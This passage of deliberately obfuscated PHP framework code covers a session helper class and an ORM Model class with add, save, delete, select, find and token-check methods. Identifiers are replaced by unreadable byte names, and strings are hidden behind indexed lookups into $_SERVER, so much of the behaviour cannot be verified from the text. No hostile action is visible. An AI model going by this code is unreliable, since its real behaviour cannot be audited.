self::$handle->set($Ášø°Ã–, serialize($…ßøâ—Â), self::$sessionTime); CacheLock::unlock($Ášø°Ã–); } public static function sign($ÀÚİÚñà = false) { if ($ÀÚİÚñà) { self::$sessionSign = $ÀÚİÚñà; } self::init(); return self::$sessionSign; } public static function set($÷Ü¦ÖéÀ, $¦€óû† = false) { self::init(); if (is_array($÷Ü¦ÖéÀ)) { foreach ($÷Ü¦ÖéÀ as $ô°³àï‡ => $­€Í¯Çó) { array_set_value(self::$data, $ô°³àï‡, $­€Í¯Çó); } } else { array_set_value(self::$data, $÷Ü¦ÖéÀ, $¦€óû†); } self::setBySign(self::$sessionSign, self::$data); } public static function get($²Ã—¤óª = false) { self::init(); if (!$²Ã—¤óª) { return self::$data; } return array_get_value(self::$data, $²Ã—¤óª); } public static function remove($“è€îğÔ) { self::init(); unset(self::$data[$“è€îğÔ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Š—Â“œÔ][901])) { self::$handle->clearTimeout(); } } } goto a³‚ïï¹¤Ù; cèéŞğË‘„: define($_SERVER[Š—Â“œÔ][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\157\162\x64\145\162", "\x61\154\x69\141\163", "\150\x61\x76\x69\x6e\x67", "\x67\x72\157\x75\x70", "\154\157\143\153", "\x64\151\163\164\151\156\x63\x74", "\141\165\164\x6f", "\146\x69\154\164\145\x72", "\166\141\x6c\151\144\x61\164\145", "\x72\145\163\x75\x6c\x74", "\142\x69\156\x64", "\164\x6f\x6b\x65\156"); public function __construct($¹²»…Æ¢ = '', $Š°¯âÛ” = '', $¡è‹†½ = '') { $šêçğğ¯ =& $_SERVER[Š—Â“œÔ]; $this->_initialize(); if (!empty($¹²»…Æ¢)) { if (strpos($¹²»…Æ¢, $šêçğğ¯[10])) { list($this->dbName, $this->name) = explode($šêçğğ¯[10], $¹²»…Æ¢); } else { $this->name = $¹²»…Æ¢; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Š°¯âÛ”)) { $this->tablePrefix = $šêçğğ¯[12]; } elseif ($šêçğğ¯[12] != $Š°¯âÛ”) { $this->tablePrefix = $Š°¯âÛ”; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($šêçğğ¯[323]); } $this->db(0, empty($this->connection) ? $¡è‹†½ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ş³¤¾Ÿ =& $_SERVER[Š—Â“œÔ]; if (empty($this->fields)) { if (think_config($Ş³¤¾Ÿ[324])) { $ì˜ŠÑ·Ê = $this->dbName ? $this->dbName : think_config($Ş³¤¾Ÿ[325]); $Íßãë’ = think_var_cache($Ş³¤¾Ÿ[326] . strtolower(get_path_this($ì˜ŠÑ·Ê) . $Ş³¤¾Ÿ[10] . $this->name)); if ($Íßãë’) { $§„—¨€ò = think_config($Ş³¤¾Ÿ[327]); if (empty($§„—¨€ò) || $Íßãë’[$Ş³¤¾Ÿ[328]] == $§„—¨€ò) { $this->fields = $Íßãë’; return; } } } $this->flush(); } } public function flush() { $˜ôö´ïŸ =& $_SERVER[Š—Â“œÔ]; $this->db->setModel($this->name); $ÖúÂ¸ô  = $this->db->getFields($this->getTableName()); if (!$ÖúÂ¸ô ) { return !1; } $this->fields = array_keys($ÖúÂ¸ô ); $this->fields[$˜ôö´ïŸ[329]] = !1; foreach ($ÖúÂ¸ô  as $†úÔ¨Œ’ => $‚ÃÀ‘¼) { $£¹Â¯Ÿ–[$†úÔ¨Œ’] = $‚ÃÀ‘¼[$˜ôö´ïŸ[33]]; if ($‚ÃÀ‘¼[$˜ôö´ïŸ[39]]) { $this->fields[$˜ôö´ïŸ[330]] = $†úÔ¨Œ’; if ($‚ÃÀ‘¼[$˜ôö´ïŸ[42]]) { $this->fields[$˜ôö´ïŸ[329]] = !0; } } } $this->fields[$˜ôö´ïŸ[331]] = $£¹Â¯Ÿ–; if (think_config($˜ôö´ïŸ[327])) { $this->fields[$˜ôö´ïŸ[328]] = think_config($˜ôö´ïŸ[327]); } if (think_config($˜ôö´ïŸ[324])) { $Ø‰ı‹›¢ = $this->dbName ? $this->dbName : think_config($˜ôö´ïŸ[325]); think_var_cache($˜ôö´ïŸ[326] . strtolower(get_path_this($Ø‰ı‹›¢) . $˜ôö´ïŸ[10] . $this->name), $this->fields); } } public function switchModel($«¹ ø‚Æ, $üÖèªâ± = array()) { $ÊñÌÚ·‡ =& $_SERVER[Š—Â“œÔ]; $³¨æÈ = ucwords(strtolower($«¹ ø‚Æ)) . $ÊñÌÚ·‡[332]; if (!class_exists($³¨æÈ)) { think_exception($³¨æÈ . think_lang($ÊñÌÚ·‡[333])); } $this->_extModel = new $³¨æÈ($this->name); if (!empty($üÖèªâ±)) { foreach ($üÖèªâ± as $Ç Õü©—) { $this->_extModel->setProperty($Ç Õü©—, $this->{$Ç Õü©—}); } } return $this->_extModel; } public function __set($ÔÈÀˆÎ, $»¶·¬û©) { $this->data[$ÔÈÀˆÎ] = $»¶·¬û©; } public function __get($Ú”•™¨³) { return isset($this->data[$Ú”•™¨³]) ? $this->data[$Ú”•™¨³] : null; } public function __isset($Üû´Ş¨š) { return isset($this->data[$Üû´Ş¨š]); } public function __unset($†öïÅƒ€) { unset($this->data[$†öïÅƒ€]); } public function __call($©€¡¬‘Õ, $›°Šö¤µ) { $¢õï¶„Ë =& $_SERVER[Š—Â“œÔ]; if (in_array(strtolower($©€¡¬‘Õ), $this->methods, !0)) { $this->options[strtolower($©€¡¬‘Õ)] = $›°Šö¤µ[0]; return $this; } elseif (in_array(strtolower($©€¡¬‘Õ), array($¢õï¶„Ë[334], $¢õï¶„Ë[335], $¢õï¶„Ë[336], $¢õï¶„Ë[337], $¢õï¶„Ë[338]), !0)) { $ÚéŸÜè = isset($›°Šö¤µ[0]) ? $›°Šö¤µ[0] : $¢õï¶„Ë[222]; $ÚéŸÜè = $this->db->parseKey($ÚéŸÜè); return $this->getField(strtoupper($©€¡¬‘Õ) . $¢õï¶„Ë[339] . $ÚéŸÜè . $¢õï¶„Ë[340] . $©€¡¬‘Õ, $¢õï¶„Ë[334]); } elseif (strtolower(substr($©€¡¬‘Õ, 0, 5)) == $¢õï¶„Ë[341]) { $ÚéŸÜè = think_parse_name(substr($©€¡¬‘Õ, 5)); $ÆÖÒØòæ[$ÚéŸÜè] = $›°Šö¤µ[0]; return $this->where($ÆÖÒØòæ)->find(); } elseif (strtolower(substr($©€¡¬‘Õ, 0, 10)) == $¢õï¶„Ë[342]) { $ùïãßˆë = think_parse_name(substr($©€¡¬‘Õ, 10)); $ÆÖÒØòæ[$ùïãßˆë] = $›°Šö¤µ[0]; return $this->where($ÆÖÒØòæ)->getField($›°Šö¤µ[1]); } elseif (isset($this->_scope[$©€¡¬‘Õ])) { return $this->scope($©€¡¬‘Õ, $›°Šö¤µ[0]); } elseif (method_exists($this, $©€¡¬‘Õ)) { array_unshift($›°Šö¤µ, $©€¡¬‘Õ); return call_user_func_array(array($this, $¢õï¶„Ë[343]), $›°Šö¤µ); } else { return call_user_func_array(array(parent, $©€¡¬‘Õ), $›°Šö¤µ); } } protected function call() { $Š™Àåü =& $_SERVER[Š—Â“œÔ]; $Ì‹½îà» = func_get_args(); $‚§Ö“‹¡ = array_shift($Ì‹½îà»); $ğ¦ÙŞ™Š = $‚§Ö“‹¡; if (is_array($‚§Ö“‹¡)) { $ğ¦ÙŞ™Š = $‚§Ö“‹¡[1]; $‚§Ö“‹¡ = $‚§Ö“‹¡[0]; } $³í¼äÏ„ = count($Ì‹½îà») - 1; if (isset($Ì‹½îà»[$³í¼äÏ„]) && $Ì‹½îà»[$³í¼äÏ„] === $‚§Ö“‹¡) { think_exception(__CLASS__ . $Š™Àåü[4] . $‚§Ö“‹¡ . think_lang($Š™Àåü[344])); return; } $Ì‹½îà»[] = $‚§Ö“‹¡; if (method_exists($this, $Š™Àåü[345])) { $ª¹Ò¡ó¨ = call_user_func_array(array($this, $Š™Àåü[346]), array($ğ¦ÙŞ™Š, $Ì‹½îà»)); if (!is_null($ª¹Ò¡ó¨) && $ª¹Ò¡ó¨ !== !1) { return $ª¹Ò¡ó¨; } } $å£ÕÑ÷ô = call_user_func_array(array($this, $‚§Ö“‹¡), $Ì‹½îà»); if (method_exists($this, $Š™Àåü[347])) { $ª¹Ò¡ó¨ = call_user_func_array(array($this, $Š™Àåü[348]), array($ğ¦ÙŞ™Š, $Ì‹½îà», $å£ÕÑ÷ô)); if ($ª¹Ò¡ó¨) { return $ª¹Ò¡ó¨; } } return $å£ÕÑ÷ô; } protected function _initialize() { } protected function _facade($¬™ìï¡) { $Öá÷Ñ× =& $_SERVER[Š—Â“œÔ]; if (!empty($this->fields)) { foreach ($¬™ìï¡ as $ä²ßõì‹ => $ôÑ£â–Æ) { if (is_array($this->fields) && !in_array($ä²ßõì‹, $this->fields, !0)) { unset($¬™ìï¡[$ä²ßõì‹]); } elseif (is_scalar($ôÑ£â–Æ)) { $this->_parseType($¬™ìï¡, $ä²ßõì‹); } } } if (!empty($this->options[$Öá÷Ñ×[349]])) { $¬™ìï¡ = array_map($this->options[$Öá÷Ñ×[349]], $¬™ìï¡); unset($this->options[$Öá÷Ñ×[349]]); } $this->_beforeWrite($¬™ìï¡); return $¬™ìï¡; } protected function _beforeWrite(&$ËÌõ·Å) { } public function add($ÙÙĞ…‹Œ = '', $ÅÙıËÃ = array(), $íô‹•¹ = false) { if (empty($ÙÙĞ…‹Œ)) { if (!empty($this->data)) { $ÙÙĞ…‹Œ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Š—Â“œÔ][350]); return !1; } } $ÅÙıËÃ = $this->_parseOptions($ÅÙıËÃ); $ÙÙĞ…‹Œ = $this->_facade($ÙÙĞ…‹Œ); if (!1 === $this->_beforeInsert($ÙÙĞ…‹Œ, $ÅÙıËÃ)) { return !1; } $°óˆ®µ = $this->db->insert($ÙÙĞ…‹Œ, $ÅÙıËÃ, $íô‹•¹); if (!1 !== $°óˆ®µ) { $±í›“ = $this->getLastInsID(); if ($±í›“) { $ÙÙĞ…‹Œ[$this->getPk()] = $±í›“; $this->_after_insert($ÙÙĞ…‹Œ, $ÅÙıËÃ); return $±í›“; } $this->_after_insert($ÙÙĞ…‹Œ, $ÅÙıËÃ); } return $°óˆ®µ; } protected function _beforeInsert(&$œİ‘‹Âû, $¯·’âØ) { } protected function _after_insert($³¾æ¥³°, $Ì úîÛŠ) { } public function addAll($ÙıÁ‹Ç, $çÁ÷šå = array(), $¶ˆÎäèÕ = false) { $‚Ãô»û =& $_SERVER[Š—Â“œÔ]; if (empty($ÙıÁ‹Ç)) { $this->error = think_lang($‚Ãô»û[350]); return !1; } $çÁ÷šå = $this->_parseOptions($çÁ÷šå); foreach ($ÙıÁ‹Ç as $Á¥øíÏŒ => $ºÒ—é–ˆ) { $ÙıÁ‹Ç[$Á¥øíÏŒ] = $this->_facade($ºÒ—é–ˆ); } if (method_exists($this->db, $‚Ãô»û[351])) { $˜ĞŸá¾Õ = $this->db->insertAll($ÙıÁ‹Ç, $çÁ÷šå, $¶ˆÎäèÕ); } else { $this->startTrans(); foreach ($ÙıÁ‹Ç as $Á¥øíÏŒ => $ºÒ—é–ˆ) { $˜ĞŸá¾Õ = $this->db->insert($ºÒ—é–ˆ, $çÁ÷šå, $¶ˆÎäèÕ); } $this->commit(); } if (!1 !== $˜ĞŸá¾Õ) { $ô·Ö”…± = $this->getLastInsID(); if ($ô·Ö”…±) { return $ô·Ö”…±; } } return $˜ĞŸá¾Õ; } public function selectAdd($Şâ«øì¯ = '', $…ëÙ¼ÉÕ = '', $¤­œô’õ = array()) { $ô‹á¥™÷ =& $_SERVER[Š—Â“œÔ]; $¤­œô’õ = $this->_parseOptions($¤­œô’õ); if (!1 === ($¾ëº¤Ë† = $this->db->selectInsert($Şâ«øì¯ ? $Şâ«øì¯ : $¤­œô’õ[$ô‹á¥™÷[352]], $…ëÙ¼ÉÕ ? $…ëÙ¼ÉÕ : $this->getTableName(), $¤­œô’õ))) { $this->error = think_lang($ô‹á¥™÷[353]); return !1; } else { return $¾ëº¤Ë†; } } public function save($Ğš†•¡é = '', $Óë‹³‹ = array()) { $ÊÙü–è =& $_SERVER[Š—Â“œÔ]; if (empty($Ğš†•¡é)) { if (!empty($this->data)) { $Ğš†•¡é = $this->data; $this->data = array(); } else { $this->error = think_lang($ÊÙü–è[350]); return !1; } } $Ğš†•¡é = $this->_facade($Ğš†•¡é); $Óë‹³‹ = $this->_parseOptions($Óë‹³‹); $êº×“•× = $this->getPk(); if (!isset($Óë‹³‹[$ÊÙü–è[354]])) { if (isset($Ğš†•¡é[$êº×“•×])) { $…ˆáÜû[$êº×“•×] = $Ğš†•¡é[$êº×“•×]; $Óë‹³‹[$ÊÙü–è[354]] = $…ˆáÜû; unset($Ğš†•¡é[$êº×“•×]); } else { $this->error = think_lang($ÊÙü–è[353]); return !1; } } if (is_array($Óë‹³‹[$ÊÙü–è[354]]) && isset($Óë‹³‹[$ÊÙü–è[354]][$êº×“•×])) { $¤•î½ŒÊ = $Óë‹³‹[$ÊÙü–è[354]][$êº×“•×]; } if (!1 === $this->_beforeUpdate($Ğš†•¡é, $Óë‹³‹)) { return !1; } $•Œ’ÙÈƒ = $this->db->update($Ğš†•¡é, $Óë‹³‹); if (!1 !== $•Œ’ÙÈƒ) { if (isset($¤•î½ŒÊ)) { $Ğš†•¡é[$êº×“•×] = $¤•î½ŒÊ; } $this->_afterUpdate($Ğš†•¡é, $Óë‹³‹); } return $•Œ’ÙÈƒ; } protected function _beforeUpdate(&$à³à†ÑÄ, $İ‹¶™á×) { } protected function _afterUpdate($¹Ö›ò‰û, $Ùï ßôà) { } public function delete($¯Øı ®ô = array()) { $¡Şã‚ìû =& $_SERVER[Š—Â“œÔ]; if (empty($¯Øı ®ô) && empty($this->options[$¡Şã‚ìû[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $›¼¢òæÀ = $this->getPk(); if (is_numeric($¯Øı ®ô) || is_string($¯Øı ®ô)) { if (strpos($¯Øı ®ô, $¡Şã‚ìû[50])) { $î¹Ğö‹[$›¼¢òæÀ] = array($¡Şã‚ìû[355], $¯Øı ®ô); } else { $î¹Ğö‹[$›¼¢òæÀ] = $¯Øı ®ô; } $this->options[$¡Şã‚ìû[354]] = $î¹Ğö‹; } $¯Øı ®ô = $this->_parseOptions(); if (is_array($¯Øı ®ô[$¡Şã‚ìû[354]]) && isset($¯Øı ®ô[$¡Şã‚ìû[354]][$›¼¢òæÀ])) { $Å¦Äâí• = $¯Øı ®ô[$¡Şã‚ìû[354]][$›¼¢òæÀ]; } $ÀñÛÅ¢Ñ = $this->db->delete($¯Øı ®ô); if (!1 !== $ÀñÛÅ¢Ñ) { $èœÓàş = array(); if (isset($Å¦Äâí•)) { $èœÓàş[$›¼¢òæÀ] = $Å¦Äâí•; } $this->_after_delete($èœÓàş, $¯Øı ®ô); } return $ÀñÛÅ¢Ñ; } protected function _after_delete($œÒÏ¾××, $ÃÈ¼±Á) { } public function select($İÎôæ´ = array()) { $€¨“¬úË =& $_SERVER[Š—Â“œÔ]; if (is_string($İÎôæ´) || is_numeric($İÎôæ´)) { $â°ÂºÈ = $this->getPk(); if (strpos($İÎôæ´, $€¨“¬úË[50])) { $ÀãÉ„úÂ[$â°ÂºÈ] = array($€¨“¬úË[355], $İÎôæ´); } else { $ÀãÉ„úÂ[$â°ÂºÈ] = $İÎôæ´; } $this->options[$€¨“¬úË[354]] = $ÀãÉ„úÂ; } elseif (!1 === $İÎôæ´) { $İÎôæ´ = $this->_parseOptions(); return $€¨“¬úË[356] . $this->db->buildSelectSql($İÎôæ´) . $€¨“¬úË[357]; } $İÎôæ´ = $this->_parseOptions(); $œåš„øª = $this->db->select($İÎôæ´); if (!1 === $œåš„øª) { return !1; } if (empty($œåš„øª)) { return null; } $this->_afterSelect($œåš„øª, $İÎôæ´); return $œåš„øª; } protected function _afterSelect(&$ÀØÑ¬´£, $Çµšâ°) { } public function buildSql($È…Å±Íå = array()) { $»‘ë ñˆ =& $_SERVER[Š—Â“œÔ]; $È…Å±Íå = $this->_parseOptions($È…Å±Íå); return $»‘ë ñˆ[356] . $this->db->buildSelectSql($È…Å±Íå) . $»‘ë ñˆ[357]; } public function optionsValue($ºæÉ¶áª = null) { if (is_null($ºæÉ¶áª)) { return $this->options; } elseif (is_array($ºæÉ¶áª)) { $this->options = array_merge($this->options, $ºæÉ¶áª); } } protected function _parseOptions($˜â™îÊÒ = array()) { $Ó€ ¹Œõ =& $_SERVER[Š—Â“œÔ]; if (is_array($˜â™îÊÒ)) { $˜â™îÊÒ = array_merge($this->options, $˜â™îÊÒ); } $this->options = array(); if (!isset($˜â™îÊÒ[$Ó€ ¹Œõ[358]])) { $˜â™îÊÒ[$Ó€ ¹Œõ[358]] = $this->getTableName(); $àĞµº…ñ = $this->fields; } else { $àĞµº…ñ = $this->getDbFields(); } if (!empty($˜â™îÊÒ[$Ó€ ¹Œõ[359]])) { $˜â™îÊÒ[$Ó€ ¹Œõ[358]] .= $Ó€ ¹Œõ[53] . $˜â™îÊÒ[$Ó€ ¹Œõ[359]]; } $˜â™îÊÒ[$Ó€ ¹Œõ[360]] = $this->name; if (isset($˜â™îÊÒ[$Ó€ ¹Œõ[354]]) && is_array($˜â™îÊÒ[$Ó€ ¹Œõ[354]]) && !empty($àĞµº…ñ) && !isset($˜â™îÊÒ[$Ó€ ¹Œõ[361]]) && !isset($˜â™îÊÒ[$Ó€ ¹Œõ[358]])) { foreach ($˜â™îÊÒ[$Ó€ ¹Œõ[354]] as $úíÉ®ãÑ => $†®ÛêĞ) { $úíÉ®ãÑ = trim($úíÉ®ãÑ); if (in_array($úíÉ®ãÑ, $àĞµº…ñ, !0)) { if (is_scalar($†®ÛêĞ)) { $this->_parseType($˜â™îÊÒ[$Ó€ ¹Œõ[354]], $úíÉ®ãÑ); } } elseif (!is_numeric($úíÉ®ãÑ) && $Ó€ ¹Œõ[11] != substr($úíÉ®ãÑ, 0, 1) && !1 === strpos($úíÉ®ãÑ, $Ó€ ¹Œõ[10]) && !1 === strpos($úíÉ®ãÑ, $Ó€ ¹Œõ[339]) && !1 === strpos($úíÉ®ãÑ, $Ó€ ¹Œõ[214]) && !1 === strpos($úíÉ®ãÑ, $Ó€ ¹Œõ[286])) { unset($˜â™îÊÒ[$Ó€ ¹Œõ[354]][$úíÉ®ãÑ]); } } } $this->_options_filter($˜â™îÊÒ); return $˜â™îÊÒ; } protected function _options_filter(&$éìàÈÔË) { } protected function _parseType(&$ıÛ™´û­, $ùÏÖ‰Å) { $º¾šĞÊô =& $_SERVER[Š—Â“œÔ]; if (empty($this->options[$º¾šĞÊô[362]][$º¾šĞÊô[4] . $ùÏÖ‰Å])) { $—êğÈÃ± = strtolower($this->fields[$º¾šĞÊô[331]][$ùÏÖ‰Å]); if (!1 !== strpos($—êğÈÃ±, $º¾šĞÊô[363])) { } elseif (!1 === strpos($—êğÈÃ±, $º¾šĞÊô[364]) && !1 !== strpos($—êğÈÃ±, $º¾šĞÊô[365])) { $ıÛ™´û­[$ùÏÖ‰Å] = intval($ıÛ™´û­[$ùÏÖ‰Å]); } elseif (!1 !== strpos($—êğÈÃ±, $º¾šĞÊô[366]) || !1 !== strpos($—êğÈÃ±, $º¾šĞÊô[367])) { $ıÛ™´û­[$ùÏÖ‰Å] = floatval($ıÛ™´û­[$ùÏÖ‰Å]); } elseif (!1 !== strpos($—êğÈÃ±, $º¾šĞÊô[368])) { $ıÛ™´û­[$ùÏÖ‰Å] = (bool) $ıÛ™´û­[$ùÏÖ‰Å]; } } } public function find($äÓ¹œ“Á = array()) { $óÅø¸˜ =& $_SERVER[Š—Â“œÔ]; if (is_numeric($äÓ¹œ“Á) || is_string($äÓ¹œ“Á)) { $Œ†úÚ¤Â[$this->getPk()] = intval($äÓ¹œ“Á); $this->options[$óÅø¸˜[354]] = $Œ†úÚ¤Â; } $this->options[$óÅø¸˜[369]] = 1; $äÓ¹œ“Á = $this->_parseOptions(); $÷úø‰Ş = $this->db->select($äÓ¹œ“Á); if (!1 === $÷úø‰Ş) { return !1; } if (empty($÷úø‰Ş)) { return null; } $this->data = $÷úø‰Ş[0]; $this->_afterFind($this->data, $äÓ¹œ“Á); if (!empty($this->options[$óÅø¸˜[370]])) { return $this->returnResult($this->data, $this->options[$óÅø¸˜[370]]); } return $this->data; } protected function _afterFind(&$¤•Õ¤Âƒ, $àµÖ­µ©) { } protected function returnResult($ÏÂ¦ë¹, $©®±Üì = '') { $ğË„ÑÆĞ =& $_SERVER[Š—Â“œÔ]; if ($©®±Üì) { if (is_callable($©®±Üì)) { return call_user_func($©®±Üì, $ÏÂ¦ë¹); } switch (strtolower($©®±Üì)) { case $ğË„ÑÆĞ[371]: return json_encode($ÏÂ¦ë¹); case $ğË„ÑÆĞ[372]: return xml_encode($ÏÂ¦ë¹); } } return $ÏÂ¦ë¹; } public function parseFieldsMap($Ä•Ş›Øì, $Î†Ïñ”â = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‹º±®ˆË => $›È”Š) { if ($Î†Ïñ”â == 1) { if (isset($Ä•Ş›Øì[$›È”Š])) { $Ä•Ş›Øì[$‹º±®ˆË] = $Ä•Ş›Øì[$›È”Š]; unset($Ä•Ş›Øì[$›È”Š]); } } else { if (isset($Ä•Ş›Øì[$‹º±®ˆË])) { $Ä•Ş›Øì[$›È”Š] = $Ä•Ş›Øì[$‹º±®ˆË]; unset($Ä•Ş›Øì[$‹º±®ˆË]); } } } } return $Ä•Ş›Øì; } public function setField($ĞÇÚœŞØ, $”ÃÔÅÒ = '') { if (is_array($ĞÇÚœŞØ)) { $ĞŒşÑ›à = $ĞÇÚœŞØ; } else { $ĞŒşÑ›à[$ĞÇÚœŞØ] = $”ÃÔÅÒ; } return $this->save($ĞŒşÑ›à); } public function setAdd($·ı°»ê, $ëÍŠ”µí = 1) { $…Œ‚Äï =& $_SERVER[Š—Â“œÔ]; $´¦Õ·øõ = $·ı°»ê . $…Œ‚Äï[373] . $ëÍŠ”µí; if ($ëÍŠ”µí < 0) { $´¦Õ·øõ = $·ı°»ê . $ëÍŠ”µí; } return $this->setField($·ı°»ê, array($…Œ‚Äï[374], $´¦Õ·øõ)); } public function getField($…ãĞä–‰, $óøÊÔŒ = null) { $‚ëüÚÎ =& $_SERVER[Š—Â“œÔ]; $ÚÅ›ªİ·[$‚ëüÚÎ[352]] = $…ãĞä–‰; $ÚÅ›ªİ· = $this->_parseOptions($ÚÅ›ªİ·); $…ãĞä–‰ = trim($…ãĞä–‰); if (strpos($…ãĞä–‰, $‚ëüÚÎ[50])) { if (!isset($ÚÅ›ªİ·[$‚ëüÚÎ[369]])) { $ÚÅ›ªİ·[$‚ëüÚÎ[369]] = is_numeric($óøÊÔŒ) ? $óøÊÔŒ : $‚ëüÚÎ[12]; } $Øåöéëã = $this->db->select($ÚÅ›ªİ·); if (!empty($Øåöéëã)) { $±ö¶ƒœÏ = explode($‚ëüÚÎ[50], $…ãĞä–‰); $…ãĞä–‰ = array_keys($Øåöéëã[0]); $ÆÜ³àæ = array_shift($…ãĞä–‰); $ã¨ÉàÊµ = array_shift($…ãĞä–‰); $œıü¯Œé = array(); $ˆ–†Å½´ = count($±ö¶ƒœÏ); foreach ($Øåöéëã as $“ˆÁ‰óÏ) { $ĞÜÃ¸¹î = $“ˆÁ‰óÏ[$ÆÜ³àæ]; if (2 == $ˆ–†Å½´) { $œıü¯Œé[$ĞÜÃ¸¹î] = $“ˆÁ‰óÏ[$ã¨ÉàÊµ]; } else { $œıü¯Œé[$ĞÜÃ¸¹î] = is_string($óøÊÔŒ) ? implode($óøÊÔŒ, $“ˆÁ‰óÏ) : $“ˆÁ‰óÏ; } } return $œıü¯Œé; } } else { if (!0 !== $óøÊÔŒ) { $ÚÅ›ªİ·[$‚ëüÚÎ[369]] = is_numeric($óøÊÔŒ) ? $óøÊÔŒ : 1; } if ($óøÊÔŒ === $‚ëüÚÎ[334]) { unset($ÚÅ›ªİ·[$‚ëüÚÎ[369]]); } $“ˆÁ‰óÏ = $this->db->select($ÚÅ›ªİ·); if (!empty($“ˆÁ‰óÏ)) { if ($óøÊÔŒ === $‚ëüÚÎ[334]) { return reset($“ˆÁ‰óÏ[0]); } if (!0 !== $óøÊÔŒ && 1 == $ÚÅ›ªİ·[$‚ëüÚÎ[369]]) { return reset($“ˆÁ‰óÏ[0]); } foreach ($“ˆÁ‰óÏ as $è¤¶†¦–) { $ôğªñš[] = $è¤¶†¦–[$…ãĞä–‰]; } return $ôğªñš; } } return null; } public function create($òÉı˜õæ = '', $¥ß‡°àÍ = '') { $³¦ºûô =& $_SERVER[Š—Â“œÔ]; if (empty($òÉı˜õæ)) { $òÉı˜õæ = $_POST; } elseif (is_object($òÉı˜õæ)) { $òÉı˜õæ = get_object_vars($òÉı˜õæ); } if (empty($òÉı˜õæ) || !is_array($òÉı˜õæ)) { $this->error = think_lang($³¦ºûô[350]); return !1; } $òÉı˜õæ = $this->parseFieldsMap($òÉı˜õæ, 0); $¥ß‡°àÍ = $¥ß‡°àÍ ? $¥ß‡°àÍ : (!empty($òÉı˜õæ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$³¦ºûô[352]])) { $¶ø•óœ· = $this->options[$³¦ºûô[352]]; unset($this->options[$³¦ºûô[352]]); } elseif ($¥ß‡°àÍ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¶ø•óœ· = $this->insertFields; } elseif ($¥ß‡°àÍ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¶ø•óœ· = $this->updateFields; } if (isset($¶ø•óœ·)) { if (is_string($¶ø•óœ·)) { $¶ø•óœ· = explode($³¦ºûô[50], $¶ø•óœ·); } if (think_config($³¦ºûô[375])) { $¶ø•óœ·[] = think_config($³¦ºûô[376]); } foreach ($òÉı˜õæ as $¨±à³Ãì => $èœ»Ê–) { if (!in_array($¨±à³Ãì, $¶ø•óœ·)) { unset($òÉı˜õæ[$¨±à³Ãì]); } } } if (!$this->autoValidation($òÉı˜õæ, $¥ß‡°àÍ)) { return !1; } if (!$this->autoCheckToken($òÉı˜õæ)) { $this->error = think_lang($³¦ºûô[377]); return !1; } if ($this->autoCheckFields) { $¶ø•óœ· = $this->getDbFields(); foreach ($òÉı˜õæ as $¨±à³Ãì => $èœ»Ê–) { if (!in_array($¨±à³Ãì, $¶ø•óœ·)) { unset($òÉı˜õæ[$¨±à³Ãì]); } elseif (MAGIC_QUOTES_GPC && is_string($èœ»Ê–)) { $òÉı˜õæ[$¨±à³Ãì] = stripslashes($èœ»Ê–); } } } $this->autoOperation($òÉı˜õæ, $¥ß‡°àÍ); $this->data = $òÉı˜õæ; return $òÉı˜õæ; } public function autoCheckToken($Ìµ©Ì’Ö) { $Ÿ¤Ù˜¤ß =& $_SERVER[Š—Â“œÔ]; if (isset($this->options[$Ÿ¤Ù˜¤ß[378]]) && !$this->options[$Ÿ¤Ù˜¤ß[378]]) { return !0; } if (think_config($Ÿ¤Ù˜¤ß[375])) { $óÂúí«¿ = think_config($Ÿ¤Ù˜¤ß[376]); if (!isset($Ìµ©Ì’Ö[$óÂúí«¿]) || Session::get($óÂúí«¿)) { return !1; } list($’Ö•ğ£, $Êà„­¸µ) = explode($Ÿ¤Ù˜¤ß[11], $Ìµ©Ì’Ö[$óÂúí«¿]); if ($Êà„­¸µ && Session::get($óÂúí«¿ . $Ÿ¤Ù˜¤ß[10] . $’Ö•ğ£) === $Êà„­¸µ) { Session::remove($óÂúí«¿ . $Ÿ¤Ù˜¤ß[10] . $’Ö•ğ£); return !0; } if (think_config($Ÿ¤Ù˜¤ß[379])) { Session::remove($óÂúí«¿ . $Ÿ¤Ù˜¤ß[10] . $’Ö•ğ£); } return !1; } return !0; } public function regex($ı–Ê½À, $õÕÆÅ¬È) { $ÂÆ¿ÍÒô =& $_SERVER[Š—Â“œÔ]; $÷éÅ§è = array($ÂÆ¿ÍÒô[380] => $ÂÆ¿ÍÒô[381], $ÂÆ¿ÍÒô[382] => $ÂÆ¿ÍÒô[383], $ÂÆ¿ÍÒô[384] => $ÂÆ¿ÍÒô[385], $ÂÆ¿ÍÒô[386] => $ÂÆ¿ÍÒô[387], $ÂÆ¿ÍÒô[388] => $ÂÆ¿ÍÒô[389], $ÂÆ¿ÍÒô[390] => $ÂÆ¿ÍÒô[391], $ÂÆ¿ÍÒô[392] => $ÂÆ¿ÍÒô[393], $ÂÆ¿ÍÒô[367] => $ÂÆ¿ÍÒô[394], $ÂÆ¿ÍÒô[395] => $ÂÆ¿ÍÒô[396]); if (isset($÷éÅ§è[strtolower($õÕÆÅ¬È)])) { $õÕÆÅ¬È = $÷éÅ§è[strtolower($õÕÆÅ¬È)]; } return preg_match($õÕÆÅ¬È, $ı–Ê½À) === 1; } private function autoOperation(&$¼ŒÈ™›¼, $áş§º¿Ø) { $ˆ„áÚúñ =& $_SERVER[Š—Â“œÔ]; if 